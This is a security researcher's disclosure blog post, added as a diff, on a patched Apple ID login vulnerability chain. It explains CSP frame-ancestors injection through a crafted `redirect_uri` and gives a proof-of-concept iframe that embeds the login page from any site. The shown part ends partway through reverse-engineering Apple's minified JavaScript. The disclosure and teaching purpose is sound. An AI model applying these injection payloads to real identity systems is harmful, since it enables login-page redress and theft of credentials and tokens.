@@ -1,0 +1,1880 @@
+import { Head } from 'next/head';
+
+<Head>
+    <meta name="tags" content="security, disclosure, writing"/>
+    <meta name="date" content="13 aug 2020"/>
+    <meta name="author" content="Thomas Neil James Shadwell"/>
+</Head>
+
+How To Hack Apple ID
+====================
+
+{/*<Description>Disclosure of a severe bug allowing client-side takeover of Apple's central AppleID server.</Description>*/}
+
+{/*
+
+<video style={{
+    borderRadius: "2rem",
+    width: "50%",
+    float: "right",
+    margin: "2rem"
+}} autoPlay loop muted src={require('./exploit_mobile.mp4')}/>
+
+**Index by Vulnerability**
+
+1. Content Security Policy injection ([§3])
+   * Remove any / call Content Security Policy controls preventing cross-site scripting attacks
+   * Remove / replace `frame-ancestors` directives, allowing us to embed the Apple ID login wherever we want.  
+   * Leverage existing information this page has such as the user email
+   * Arbitrarily redress the Apple ID login page, for example covering the password input with our own, stealing the user's password.
+
+2. `postMessage`, send access control list bypass ([§7])
+   * Bypass the access control AppleID uses to prevent other origins impersonating authenticating parties.
+   * Impersonate arbitrary AppleID clients, such as iCloud, at least as far
+   as *sending* messages is concerned.
+
+3. `postMessage`, receive access control list bypass. ([§8])
+   * Recieve information intended expressly for iCloud and other Apple ID applications
+   * In conjunction with (2), impersonate arbitary Apple ID applications.
+   * Recieve iCloud and other Apple ID applications' authorization tokens, including before 2FA is completed.
+   * In conjunction with (2), inject configuration options that affect the appearance and function of the Apple ID login page.
+
+4. XSS via JSONRPC 'config' method ([§9])
+   * Take over the Apple ID system, `idmsa.apple.com` temporarily in the victim's browser.
+   * Escape from the embedding frame and take over other, legitimate `idmsa.apple.com` pages.
+   * Extract usernames, passwords and 2FA tokens from `idmsa.apple.com` pages, even where the user has not passed 2FA (due to FindMy letting you find your phone without passing 2FA)
+
+## Preamble
+
+[§1]: #Preamble
+
+### Fear, Romance, and Vulnerability
+
+The intersection of internet and identity is one with a long and fascinating
+history because it's imbued with so many ideals about how people's real lives
+interact with their internet lives. Software and security architectures are
+always created with a particular idea of technical morality which gets encoded
+into the algorithms that underpin the systems themselves.
+
+One idea I tend to think about a lot when it comes to people and their
+interaction with information security systems is one I've never been able to
+find the source of. It may well be false or apocryphal but it sticks with me
+still.
+
+It said the invention of Public Key Cryptography was due, at least in part to
+the understanding that in the future, people would have ever more meaningful
+relationships online. In a world before cryptography between individuals was a
+meaningful thing, a relationship had online -- as friends or otherwise -- was a
+relationship had in the open.
+
+One can absolutely debate forever about to what extent someone's representation
+of themselves on social media, or their favourite gaming platform is an
+indirect, curated representation of themselves but one thing that is for sure is
+that whatever's in your iCloud is a pretty raw representation of self.
+
+That's fascinating to me. For most of the time I used the internet my email was full of weird junk and my social media accounts had some platitudes about whatever was funny online. The closest these profiles came to being 'real' was the rare profile picture I might have of my face.
+
+If you hacked these accounts, or you got my computer you might mull over the number of image macros I had bookmarked, but you wouldn't really have much of an idea of what my life was like. Now I talk to all of my friends on a medium that's recorded forever and I have every photo I ever took of my life and my relationships back to 2014.
+
+Often discussion of this comes with a heavy-handed sense of fear that such things are 'online' but that's not something I fear, or what I'm trying to draw attention to. To me, what's fascinating is that someone's real life history and identity is online at all, that between me and knowing everything about you are a few security systems.
+
+[When, in 2014][1] "a collection of almost 500 private pictures of various celebrities, mostly women, and with many containing nudity, were posted on the imageboard 4chan ... initially believed to have been obtained via a breach of Apple's cloud services suite iCloud"  -- I had this realisation that the people whose lives were 'online' weren't the people who sent sexts over MySpace chat anymore, it was everyone. Like hacking someone's 'Cyberbrain' in Ghost In The Shell, hacking someone's personal cloud storage was like peering directly into their life and seeing it from their eyes.
+
+[1]: https://en.wikipedia.org/wiki/ICloud_leaks_of_celebrity_photos
+
+In this article I'll be describing and demonstrating to the best of my ability a
+now patched series of exploits on the Apple identity systems idmsa.apple.com.
+
+There's a particular framework in which I want such issues to be understood, though. It's an angle on my understanding of the context of issues I find that I've thought a lot about, but never tried to write down before. 
+
+Over the years as I've grown and matured the stuff I've hacked has only grown in impact. Consider, for example my [2017 hack of a nation's tax system][2]. When people hear about this stuff, the first thing they think is 'oh no! what if it happened to me'. And they think about how *bad* security must be to get there.
+
+[2]: https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b
+
+That's something that I think is maybe even harmful to the general public's understanding of security. It puts all vulnerabilities on the same table. In reality, I see vulnerabilities as running along this asymtotic curve of *complexity* vs *impact*. It's the landscape representing all the bugs that are out there.
+
+The more complicated a security bug is, the less likely it is to be discovered, but also the more likely it is to be really dangerous if found. There's literally hundreds if not thousands of extremely high complexity security vulnerabilities in any system, software or otherwise. But the reason that all our shit doesn't fall apart is because high complexity means *difficult to find*.
+
+This puts the bugs I find in a fairly uncomfortable place. Sure, the bugs are really impactful, and really bad on the surface but the fact that they exist doesn't necessarily indicate a severe flaw in the underlying security system.
+
+That doesn't mean the bugs weren't worth finding either -- really complicated bugs are the kind that might one day absolutely ruin you if put in the hands of some wealthy organized crime syndicate that bought it at auction or an authoritarian state actor you've crossed.
+
+My heavily laboured point is that it's important to differentiate security issues that need to get written by someone who is likely already an industry professional versus bugs that can be dug up by anyone pasting from the 'XSS Evasion Cheat Sheet'.
+
+The former is much scarier *when found* than the latter, but the latter is much scarier in general because it's far, far more likely to happen in a malicious context. *HeartBleed* is a terrifying bug. But bug categories need to be worried about versus their likelihood of happening. If we drop the whole security budget on preventing the next HeartBleed by porting all our systems to SELinux, a 16 year old HackForums reader named 'm4rshv1perX' is going to XSS our admins and dump our SQL database online.
+
+Though bug bounties are currently fodder for 10,000 medium severity issues on staging.john.production.com this is what I always saw bug bounties and vulnerability disclosure as perfect for: scooping up the vulnerabilities produced by people who just happen to have some special research that breaches that area of high complication. 
+
+Just a few minutes attention from some Project Zero guys is worth tens of thousands of dollars if I could only tempt them with my fine selection of bounty shirts and glass tumblers with company logos. 
+
+## How to Hack Apple ID
+
+Some time ago when I was sick with flu and researching Apple security to distract me from the aches and pains of my failing mortal body I found an XSS deep in an apple.com subdomain.
+
+That's to say, I could inject some code into a website somewhere on apple.com, which, to a user's web browser looked like it was written by Apple.
+
+In such cases, my code is granted all the privilages associated with Being Code That Apple Wrote inside a web browser, such as being able to talk to Apple servers on the user's behalf.
+
+Typically, for an XSS on the subdomain `users.bradsdrinks.com` we only get access to whatever `bradsdrinks.com` can do. Which means if Brad's Great Drinks, USA owns another fine website, `bradsbetterdrinks.com` we can't mess with that.
+
+For `apple.com`, this means I can steal the 'apple session', which indicates who you are to Apple, and do bad stuff you wouldn't want me to do, like purchase gifts for myself in the apple store with *your* credit card.
+
+At this point, trying to think of the worst thing that could possibly happen with this vulnerability I thought -- well, what if I get into iCloud? That would be really, really terrible right?
+
+But I icloud is *not* on `apple.com`. iCloud has its own domain, `icloud.com`. This means that a bug in `apple.com` won't affect `iCloud.com`. Probably. There's a kind of domain-based sandbox that separates `apple.com` from `icloud.com`.
+
+But then -- if I am logged into `apple.com`, and I try to log into `icloud.com`, the login dialog shows my email on the email line without me ever having entered it. How is this possible? 
+
+As it would turn out, the apple login system is located at `idmsa.apple.com`, so it has access to your Apple login session. And it's _embedded_ into icloud: there's a little bit of `apple.com` in `icloud.com`.
+
+`icloud.com` then negotiates with `idmsa.apple.com` that it should have access to the iCloud servers. That is the crux of the vulnerability.
+
+Let's talk quickly about embedding. If I want to share the legendary [SM64 - Watch for Rolling Rocks - 0.5x A Presses (Commentated)][3] video from YouTube I might want to put in a video player. and, thank the gods, the 'share' button _still_ has an 'embed' option with some HTML code after 10 years or however long YouTube has been around for.
+
+[3]: https://www.youtube.com/watch?v=kpk2tdsPh0A
+
+```HTML
+<iframe width="560" height="315"
+src="https://www.youtube.com/embed/kpk2tdsPh0A" frameborder="0"
+allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"
+allowfullscreen></iframe>
+```
+
+The iframe is a world wide web classic. Content can transclude other content, if the content wishes to be so transcluded.
+
+But I put this to you: if I could just embed *anything* on my website, we'd be
+having a bad time. I'd wake up, have a bad day, decide to do some crimes and embed your bank account right into my site in such a way that clicking in an unassuming place transfers money right into my bank account.
+
+Web browsers realised this was a problem pretty fast, thank God and they introduced an HTTP header called `X-Frame-Options`. It was the early 2000s, so they sort of all did it their own way, but luckily they managed to get the sense to have `X-Frame-Options: DENY` and `X-Frame-Options: SAMEORIGIN` work in all notable browsers.
+
+There's secretly a third, `allow-from [domain]`, which existed for a little while in *maybe* one browser. The idea was you'd set '`allow-from mywebsite2.com`' and then *just* '`mywebsite2.com`' can embed your webpage.
+
+`idmsa.apple.com` uses this header, and it's actually, amusingly, the *only* place I have *ever* seen this header used. Apple sets it to:
+
+```HTTP
+X-FRAME-OPTIONS: ALLOW-FROM https://www.icloud.com
+```
+
+What does this do? Absolutely nothing in any mordern browser. It's not even
+equivalent to `DENY`. it lets any website embed you. Such is the problem with designing security controls without consensus.
+
+This would be really bad, and I'd say uncharaceristically bad for Apple. But Apple, eternal in its wisdom, backs up the old-timey `X-Frame-Options: ALLOW-FROM` with the cool new shiny approach: Content Security Policy `frame-ancestors`.
+
+For context, `X-Frame-Options` was a bit short sighted for a few reasons that are of course, obvious to us now. Take a look at this short HTTP conversation:
+
+```HTTP
+HTTP GET /watch_for_rolling_rocks_embed
+
+HTTP/1.1
+Host: mywebsite1.com
+Origin: https://mywebsite2.com
+Referer: https://mywebsite2.com/pannenkoek2012fanpage.html
+Accept: text/html
+
+HTTP/1.1 200 OK
+<!DOCTYPE HTML>
+    <head>
+    <title> check out this video!!!! </title> ...
+
+```
+In this simplified case, `mywebsite1.com` notices that it's being
+embedded by `mywebsite2.com` and doesn't send `X-Frame-Options: DENY`, so it can be embedded.
+
+But I put to you this: what if `mywebsite2.com` *forgets* to send `X-Frame-Options: DENY`? Can't someone just embed `mywebsite2.com` to embed `mywebsite1.com` indirectly then? Yes.
+
+Frame ancestors works a bit differently, as a result. With `frame-ancestors`, you specify every possible parent page (or *ancestor*), and if there is a page embedding a page embedding a page ... and so on that is not in that list, your page is blocked from showing. And you'd be safe.
+
+### I'm allowed to do this, trust me.
+
+[URL Parsing, My Old Friend]: #url_parsing,_my_old_friend 
+[§3]: #url_parsing,_my_old_friend
+
+The iCloud login page, we now know is secretly handled by the Apple ID login server, `idmsa.apple.com` -- the permission for which is granted by a '`frame-ancestors`' directive. But how does that directive come into being?
+
+Here's an embed URL extracted from a real iCloud login page.
+
+```URL
+https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fwww.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB
+```
+
+Let's break that down so we can read it more easily.
+
+```
+Resource:  https://idmsa.apple.com/appleauth/auth/authorize/signin
+Parameters:
+    client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d
+
+    redirect_uri=https%3A%2F%2Fwww.icloud.com
+
+    response_mode=web_message
+
+    response_type=code
+
+    frame_id=72948678-5374-4a90-a176-31f75bb38405
+    
+    locale=en_GB
+```
+
+This is pretty clearly OAuth 2.0, an authentication protocol on which most of the 'federated login' (login with Google / Facebook ... ) systems are built.[^1]
+
+[^1]:
+    Technically speaking, OAuth 2.0, being an authorization (authZ) protocol should not be used for identifying a user. This is a subtle but meaningful nuance that I've spent a lot of my career working with. In particular, OAuth 2.0 is not designed to answer the question 'Who is the current user?', it's meant to answer the question 'What is the current user letting us do?'.
+    
+    OpenID Connect is the authorization (authN) protocol built on OAuth 2.0 that provides that funcionality. It's such a huge and tragic misconception that it's worth mentioning. The question of 'Can website X know my name?' vs 'Do you authorise a login to website X?' are just *tragically* different questions, with very different security reprocussions.
+
+There is an oddity here, but before we get into it, OAuth is a great choice for this security model. Because OAuth tokens are not interchangable between clients, if I hacked e.g. your iMessage, it might be issued a different token to your iCloud, and I couldn't use the less scary one to get into the more scary one.[^2]
+
+[^2]:
+    This is quite nice to see! When I wrote the skeleton of `passport.twitch.tv`, the Twitch login system back in 2015 (!), it worked something like this, with `passport.twitch` acting as an OAuth 2.0 (OIDC) server to Twitch itself -- this meant that hacking the Twitch web client wouldn't get you user credentials 😉
+
+The oddity is that OAuth 2.0 is specced out as a full-page redirect. Normally, you'd click a 'Login with Apple' button, and it'd take you to a 'Login with Apple' page that you could verify in the address bar. Now, clearly, iCloud *is* Apple, so we don't really need to verify that it's not a phishing site, but Apple is extending the normal protocol here.
+
+Let's break down what these parameters mean:
+
+<dl>
+<dt>
+
+`response_type=code`
+
+</dt>
+<dd>
+
+An OAuth specific parameter asking for an [OAuth code] -- in essence, a ticket that is exchanged by the iCloud backend for an OAuth token which gives the actual access[^3] -- which the iCloud servers can exchange for an Apple ID credential.
+
+</dd>
+
+
+<dt>
+
+`redirect_uri=https://www.icloud.com`
+
+</dt>
+<dd>
+
+Also an OAuth specific concept, it kind of exposes the weirdness going on with embedded OAuth.
+
+Typically, once the OAuth dance is complete and the user has granted access, the `redirect_uri` indicates[^4] where the credentials should be sent to, via a full page *redirect*.
+
+You might notice this doesn't happen in apple's embedded iCloud flow, but this parameter still plays something of a role in specifying who the embedding page is (in this case, iCloud).
+
+</dd>
+<dt>
+
+`response_mode=web_message`
+
+</dt>
+<dd>
+
+Appears to be the special indicator to the Apple ID server that we don't want normal OAuth, we want an embedded page that passes us the token eventually. 'web message' in this case likely refers to the `postMessage` API which is used to securely communicate between embeds and other webpages.
+
+</dd>
+<dt>
+
+`locale`
+
+</dt>
+<dd>
+
+Just indicates the language to show the login dialog in.
+
+</dd>
+
+<dt>
+
+`frame_id`
+
+</dt>
+<dd>
+
+I think is just to help differentiate cases where there may be multiple different embedded pages.
+
+</dd>
+
+
+</dl>
+
+[OAuth code]: https://tools.ietf.org/html/rfc6749#section-1.3.1
+[^3]:
+    Desparately trying not to get too deep into the OAuth weeds here. The thing about 'OAuth code flow' is that lots of people think it's *more secure* than OAuth *token* flow, which just grants the token right out. It is, but *sometimes*.
+
+    OAuth 2.0, and, well, also OAuth were designed for an internet where SSL/TLS encryption (that's `https://`) were not ubiquitous. OAuth 1.0 (which sucks by the way, please never use it) actually stipulates some pretty strong cryptography *on top* of HTTP to try to solve this exact problem.
+
+    Expecting your OAuth token to be immediately compromised by someone running [Firesheep] in your local coffee room, OAuth 2.0 was designed to use a technique called 'client confidentiality' where your browser doesn't get an actual OAuth token, but instead the aforementioned 'OAuth Code', which can only be exchanged by the backend (in this case the iCloud server) for an OAuth token.
+
+    Sorry, did I say it gets exchanged for an OAuth token? Sorry, it gets exchanged for a [refresh token], which then, in turn gets exchanged for an OAuth 'access token'. This process of exchange requires a special 'client secret' that is scoped only to the backend (confusingly called the 'OAuth client' in the spec) and is never transmitted.
+    
+    This is for the same reason. If we kept sending out OAuth tokens with every request from the backend, eventually they'd get compromised because no `https:` yet! Or -- at least, in the modern day logged by some overzealous HTTP reverse proxy. Then, the attacker could just keep using that token after intercepting it / hacking the reverse-proxy server.
+[Firesheep]: https://en.wikipedia.org/wiki/Firesheep
+[refresh token]: https://tools.ietf.org/html/rfc6749#section-6
+
+[^4]:
+    Here with another unsolicited OAuth fact(tm) again. The `redirect_uri` basically does jack shit in most implementations of OAuth 2.0, for pretty good reason. See, the once often implemented original idea is that registered OAuth clients would have some arbitrary mechanism for specifying whole *swathes* of places that the tokens could be redirected to, like `*.google.com`, but this was a huge mistake as -- for various reasons I won't get into here, URL parsing, especially in the HTTP context is a fucking *nightmare*.
+
+    So the spec got changed to specify usually a single `redirect_uri`, and *sometimes* a bunch of hard-coded, strictly allowlisted `redirect_uri`s.
+
+    This kinda thing comes up often when you have a bunch of staging environments like `my-branch-1.staging.google.tech` and people always ask if they can wildcard like `*.staging.google.tech`. You *can* kinda do this, but be careful as fuck, and if you dont have an expert to hand it's probably, surprisingly, safer to just implement a forwarder.
+
+### Strategy Time
+
+Clearly, our intention here is to do something damaging to this AppleID login dialog.
+
+In security, you ususally think about this kind of thing in terms of the 'attack surface'. Software systems can be thought of as a series of fuzzy boundaries. As an attacker in the web, we should enumerate the ways we can affect the AppleID dialog code:
+
+1. We can try to send the victim to a special URL on `icloud.com` and hope that it affects the login dialog. If the `redirect_uri` is derived from the location, we might be able to add extra stuff to the url that might be misinterpreted.
+
+2. We can try to embed the AppleID login dialog, but doing so requires:
+
+    1. Bypassing the `frame-ancestors` directive somehow (`redirect_uri` injection?)
+
+    2. Some other sink on the embed frame itself. TBD.
+
+3. We could try attacking the the `postMessage` mechanism the embed uses to communicate with its parent. If it doesn't sufficiently verify the communication to its parent, we could impersonate it and affect its internal state.
+
+
+### Writing our own Policies
+
+
+[How to hack the UK Tax System]: https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b
+
+```
+redirect_uri=https%3A%2F%2Fthomas@www.icloud.com
+```
+
+This is an old and extremely not supposed to be used syntax called 'HTTP Simple
+Authentication URL Syntax'. The idea is that you could specify *in* the url how
+you wanted to login. For example, if I wanted to log into `google.com` as my
+account 'thomas', I'd open up in my browser `https://thomas@google.com` and the
+webpage might ask for the password for my account `thomas`.
+
+The 'great' thing about this syntax when it comes to hacking websites is that
+HTTP Simple Authentication URL syntax is *not* part of the URL specification,
+meaning that even the most advanced URL parser is not meant to understand it,
+and will give you wrong answers.
+
+For example, if I give `https://google.com@evil.com` to a normal URL parser, it
+doesn't know what the `@` means and might assume the URL goes a resource called
+`@evil.com` at `https://google.com`, when in fact if you give this to any modern
+browser it'll recognise the URL using its HTTP specific parser as going to
+`https://evil.com`.
+
+In this case, when `idmsa.apple.com` accepts
+`redirect_uri=https://thomas@www.icloud.com`, it's actually *correct* in
+thinking that this URL is actually just `https://icloud.com` and letting the
+request through. But we've injected some extra characters in that might mess up
+some other part of the system.
+
+OK, so, great, if I load
+`https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fthomas@www.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB`
+containing the `redirect_uri` `https://thomas@icloud.com` what `frame-ancestors`
+header do we get?
+
+``` HTTP
+Content-Security-Policy: frame-ancestors https://thomas@icloud.com
+```
+
+Hmm. That doesn't look like it should be there. `frame-ancestors` is defined to
+accept a list of [HTTP origins][frame-ancestors], a very strict type of website specifier
+designed for security that `https://thomas@icloud.com` most certianly is not.
+
+[frame-ancestors]:
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors
+
+When I see stuff like this it makes me think for two reasons: (1) if
+`frame-ancestors` is consuming something that isn't an HTTP Origin then the
+authors probably didn't expect what I'm currently doing and (2) since the origin
+isn't extracted from the URL, they're *validating* the URL rather than
+*transforming* it.
+
+Transformation rather than validation is something I personally try to push a
+lot. Almost always in a system, one's own understanding of everything about the
+technology you're working with is incomplete. For example, here the authors of
+the Apple ID login system didn't know about this URL syntax. If we *transform*
+the inputs we get including only the information we expect and understand, we
+strip out a lot of potential for esoteric functionality to bypass our security
+controls.
+
+Since Apple *validated* rather than transforming, the URL met their criteria for
+what a 'safe' URL looked like and passed through. But -- based on my tests,
+Apple definitely actually *checks and validates* the origin of the submitted
+`redirect_uri`.
+
+If, instead of deciding if the URL is good or not, they instead *also* extracted
+which part they thought was good (`https://icloud.com`) then I wouldn't be able
+to inject characters here. I think of this as 'baking in' our understanding of
+what a URL looks like and forcing it conform to that understanding.
+
+### Content Insecurity Policy {#content_insecurity_policy}
+
+[Content Insecurity Policy]: #content_insecurity_policy
+[§4]: #content_insecurity_policy
+
+With the knowledge that I could sneak extra characters into the
+`frame-ancestors` directive that validates who can embed the iCloud (really
+Apple ID) login form, I, well, immediately tried to inject something that would
+break and/or change the action of `frame-ancestors`.
+
+Let's try:
+
+```query
+redirect_uri=https://thomas;@www.icloud.com
+```
+
+This should be a totally valid HTTP Simple Authentication URL with the username
+`thomas;`, but `;` is an important character in `Content-Security-Policy` as it
+is used to mark the end of each policy segment, for example:
+
+``` HTTP
+Content-Security-Policy: default-src https://google.com; frame-ancestors https://mywebsite2.com
+```
+
+This Content Security Policy dictates that valid resources can only be loaded
+from the HTTP origin `https://google.com`, and that this page can only be
+embedded by `https://mywebsite2.com`.
+
+I digressed: what actually happens? Check it out:
+
+```HTTP
+Content-Security-Policy: frame-ancestors https://thomas;@www.icloud.com
+```
+
+That's gotta break something, right? Correct. The Google Chrome console tells
+me, helpfully:
+
+```
+Unrecognised Content-Security-Policy directive '@www.icloud.com'
+```
+
+This means the browser now thinks a valid origin to embed the iCloud
+athentication dialog at `idmsa.apple.com` is `https://thomas`.
+
+If you want to replicate this moment as I experienced it, close your eyes;
+imagine yourself really sick with flu and say 'fuck. oh my god. what the fuck.'.
+Now you understand.
+
+Alright. I realise I forgot to tell you to open your eyes again. If they're
+still closed you should open them.
+
+Next step: embed the iCloud login page in our page and pretend to be iCloud
+(easy right?) if we can do this, we should just be able to steal the icloud
+token it returns.
+
+Going from this to having an actual `redirect_uri` we can use takes quite a bit
+of doing since Apple is so stringent on the characters we're allowed to use.
+Typically, we'd just send ` '*'` to tell `frame-ancestors` anything is OK to
+embed this page, but `'` is disallowed. Instead we'll try to make `https://*`,
+which means 'any website over HTTPS.
+
+```HTML
+<iframe
+src="https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2F*;@www.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB"></iframe>
+```
+
+If you go back in time to before this was fixed and you use this HTML code you
+will notice two things: (1) the `frame-ancestors` directive is correctly sent as
+`frame-ancestors https://*;@www.icloud.com` and (2) all we get from the world's
+most overengineered embed is a big, slightly off-white box.
+
+It's a big, slightly off-white box that's from fricken' `apple.com`, but still!
+
+
+### A Big, Slightly Off-White Box {#off_white_box}
+
+[A Big, Slightly Off-White Box]: #url-parsing-my-old-friend
+
+[§5]: #url-parsing-my-old-friend
+
+There are readers among us, I imagine who see the previous few hundreds of words
+and think 'oh, good, we must be reaching the end, we've done the impossible and
+embedded Apple ID Signin. The author is so great i rate all of their blog posts
+10 out of 10 what an amazing blogger'.
+
+But you'd be wrong. We arrive only at the beginninning of by far the longest
+vulnerability I have ever found in a web application. It starts with this white
+box.
+
+Let's engage in a socratic diaglogue. I'll be Euclid.
+
+> Euclid: Why is there a white box?
+>
+> You: Why am I in this? I thought I was
+the reader.
+>
+> Euclid: Why is there a white box?
+>
+> You: Cancel. Quit. ^C
+>
+> Euclid: Why is there a white box?
+>
+> You (sighing): Because even though we've
+loaded the Apple ID signin page, it hasn't loaded any content
+>
+> Euclid: Why hasn't it loaded any content?
+>
+> You: I don't know? You tell me. It's your
+article dude
+>
+> Euclid (me): ok sure whatever
+>
+> [Euclid] has quit
+[Leaving...]
+
+You're right. The box is still white because it hasn't loaded any content. Why?
+Likely as a security measure, the login dialog expects initialization.
+
+I guessed early and correctly that the dialog probably needs `postMessage`
+initialization, especially considering the designation of the auth flow as
+`web_message`.
+
+I spent a lot of time trying to reverse engineer the `idmsa.apple.com`  code,
+which is all highly compressed and minified.
+
+A key observation that led me through the 47,128 lines of code in `app.js` which
+power the Apple ID signin process was that because my 'client' that was
+embedding the Apple ID system was 'misconfigured' (i.e. fucking broken) Apple ID
+sent a message to a log system every time telling it something that went wrong.
+
+```json
+{"type":"ERROR","title":"PMRPErrorMessageSequence","message":"APPLE ID : PMRPC Message Sequence log fail at AuthWidget.","iframeId":"601683d3-4d35-4edf-a33e-6d3266709de3","details":"{\"m\":\"a:28632989 b:DEA2CA08 c:req h:rPR e:wSR:SR|a:28633252 b:196F05FD c:req h:rPR e:wSR:SR|a:28633500 b:DEA2CA08 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28633598 b:B74DD348 c:req h:rPR e:wSR:SR|a:28633765 b:196F05FD c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28634110 b:BE7671A8 c:req h:rPR e:wSR:SR|a:28634110 b:B74DD348 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28634621 b:BE7671A8 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28635123 b:E6F267A9 c:req h:rPR e:wSR:SR|a:28635130 b:25A38CEC c:req h:r e:wSR:SR|a:28635635 b:E6F267A9 c:rRE f:Application error. Destination unavailable. 500 h:rPR e:f2:rRE|a:28636142 b:25A38CEC c:rRE f:Application error. Destination unavailable. 1000 h:r e:f2:rRE\",\"pageVisibilityState\":\"visible\"}"}
+```
+
+As you can probably tell, this mesage is completely useless for telling us what
+exactly we need to change to make our client work, but we can leverage a
+techique I used for my [Steam Remote Code Execution][5]. If an application does
+something, and we want to know why (in this case, why it won't load), we can set
+an 'XHR/fetch breakpoint' in Chrome Developer Tools's 'Sources' pane which looks
+for that action -- in this case, loading
+`https://idmsa.apple.com/appleauth/jslog`. 
+
+[5]: https://hackerone.com/reports/409850
+
+When the breakpoint fires (when the error occurs), the Javascript application
+will be paused until we tell it to continue again, allowing us to look at what's
+going on. We can then use the call stack, representing the sequence of function
+calls that got us there to look at all the things that happened to lead up to
+this error.
+
+
+The breakpoint fires on a code context that looks like this:
+
+```javascript
+e.details && (e.details = JSON.stringify(e.details)),
+t && r(t);
+try {
+    var o = new XMLHttpRequest;
+    o.open(a.METHOD, d, !0),
+    o.setRequestHeader("Content-type", "application/json"),
+    o.setRequestHeader("Accept", "application/json"),
+    o.setRequestHeader("scnt", p),
+    o.setRequestHeader("x-csrf-token", m),
+    o.addEventListener("error", n),
+    o.addEventListener("abort", n),
+    o.onreadystatechange = function() {
+        o.status
+    }
+    ,
+    "OFF" !== c && ("INFO" === c || "ERROR" === c ? "ERROR" !== e.type.toUpperCase().trim() && "INFO" !== e.type.toUpperCase().trim() || o.send(JSON.stringify(e)) : "DEBUG" === c && o.send(JSON.stringify(e)))
+} catch (e) {}
+
+
+```
+
+The Javascript code readers out there will probably be able to tell that this is just some pretty simple code which sends some arbitrary kind of information to the server.
+
+If we step up in the call stack we get:
+
+```javascript
+x(),
+b.a.log({
+    type: ot.JSLOG.TYPES.INFO,
+    title: ot.JSLOG.TITLES.APPLE_AUTH_DEBUG,
+    message: "Launching AppleAuth application.",
+    iframeId: p.a.iframeId || ""
+});
+try {
+    s.a.USE_AUTH_EVENTS ? ft() : setTimeout(function() {
+        ft()
+    }, p.a.meta.FEConfiguration.appLoadDelay)
+} catch (t) {
+    b.a.log({
+        type: ot.JSLOG.TYPES.ERROR,
+        title: t.name,
+        message: t.message,
+        stacktrace: t.stack,
+        details: {
+            file: t.fileName,
+            lineno: t.lineNumber,
+            colno: t.columnNumber,
+            caught: "YES"
+        },
+        iframeId: p.a.iframeId || ""
+    }),
+    ut()
+}
+
+```
+
+We're clearly getting somewhere. It looks like the server logging was triggered by a call to `b.a.log()`, which lets the system know what it's trying to do. The error we are likely seeing is from the `try{} catch() {}` clause. Well, what are we trying?
+
+```javascript
+try {
+    s.a.USE_AUTH_EVENTS ? ft() : setTimeout(function() {
+        ft()
+    }, p.a.meta.FEConfiguration.appLoadDelay)
+} catch (t) {
+```
+
+There are two outcomes of this code: (1) the function ft() gets run immediately or (2) it gets run after a timeout specified by `p.a.meta.FEConfiguration.applLoadDelay`. What's `ft()`? `ft()`, is, and I can't put this any other way -- a very beefy boy.
+
+### Analysing the 'Beefy Boy' {#analysing-the-beefy-boy}
+[Analysing the 'Beefy Boy']: #analysing-the-beefy-boy
+[§6]: #analysing-the-beefy-boy
+
+```javascript
+regeneratorRuntime.async(function(t) {
+(; ; )
+switch (t.prev = t.next) {
+case 0:
+    if (s.a.USE_AUTH_EVENTS)
+        return s.a.on("config", function(e) {
+            return regeneratorRuntime.async(function(t) {
+                for (; ; )
+                    switch (t.prev = t.next) {
+                    case 0:
+                        return t.prev = 0,
+                        p.a.envConfigFromConsumer = $(e),
+                        t.next = 4,
+                        regeneratorRuntime.awrap(lt(p.a.envConfigFromConsumer.context));
+                    case 4:
+                        Q(),
+                        Y(p.a, pt),
+                        t.next = 12;
+                        break;
+                    case 8:
+                        t.prev = 8,
+                        t.t0 = t.catch(0),
+                        b.a.log({
+                            type: ot.JSLOG.TYPES.ERROR,
+                            title: ot.JSLOG.TITLES.PMRPC_MESSAGE_SEQUENCE_ERROR,
+                            message: "PMRPC Message Sequence log fail at AuthWidget.",
+                            iframeId: p.a.iframeId || "",
+                            details: {
+                                m: s.a.getLogs()
+                            }
+                        }),
+                        "object" === rt(c()(t.t0, "jqXHR", void 0)) ? ct(void 0, Object(v.b)(m.a.FAILED_TO_VALIDATE_CONTEXT, "Provided context [ ".concat(p.a.envConfigFromConsumer.context, " ] is not supported for this application."))) : (b.a.log({
+                            type: ot.JSLOG.TYPES.ERROR,
+                            title: ot.JSLOG.TITLES.APPLE_AUTH_DEBUG,
+                            message: c()(t.t0, "message", "Unexpected error."),
+                            stacktrace: c()(t.t0, "stack", "Stacktrace not found."),
+                            iframeId: p.a.iframeId || ""
+                        }),
+                        ut(t.t0));
+// ... way more after this ...
+```
+
+This is code that no human was ever meant to read, produced by thousands of lines of machine optimization. And I'm sorry. But I love reading this stuff.
+
+A big part in making this code so inaccessible is the `regeneratorRuntime.async()` call. `regeneratorRuntime` is a shim which lets code written for modern browsers supporting `async` and `await` run in older browsers. It will have been generated by a transpiler which analyzes the code to make it smaller, more efficient and support more browsers (almost certianly [Babel][6]).
+
+[6]: https://babeljs.io/
+
